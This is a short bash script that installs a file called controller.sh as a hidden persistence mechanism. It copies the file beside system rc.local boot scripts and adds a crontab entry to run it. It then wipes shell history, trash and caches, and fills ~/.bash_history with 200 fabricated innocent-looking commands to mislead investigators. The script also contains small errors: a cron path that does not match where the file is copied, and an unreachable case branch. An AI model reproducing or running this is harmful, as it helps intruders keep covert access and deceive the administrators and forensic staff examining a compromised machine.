#!/bin/bash

chmod +x controller.sh
LOCATIONS=("/etc/rc.local"
           "/etc/rc.d/rc.local"
           "/etc/init.d/rc.local"
           "/etc/systemd/system/basic.target/rc.local"
           "/etc/systemd/system/multi-user.target/rc.local")

for LOCATION in "${LOCATIONS[@]}"
do
    if [ -f "$LOCATION" ]; then
        cp -p "controller.sh" "${LOCATION%/*}/controller.sh" &> /dev/null
    fi
done
(crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/rc.local/controller.sh") | crontab -

#garbage
history -c
rm -f $HOME/.bash_history
rm -rf $HOME/.local/share/Trash/*
rm -rf $HOME/.cache/*
for i in {1..200}; do
  case $((RANDOM%10)) in
    0) echo "ls -al";;
    1) echo "cat /etc/passwd";;
    2) echo "tail -n 10 /var/log/syslog";;
    3) echo "ps -ef";;
    4) echo "cd /var/log && tail -n 10 syslog";;
    5) echo "ls -la";;
    6) echo "cd ..";;
    7) echo "cat /etc/passwd";;
    8) echo "sudo apt-get update";;
    9) echo "whoami";;
    10) echo "cat /etc/ssh/sshd_config";;
  esac
done >> ~/.bash_history
#remember to clear history in browser i guess
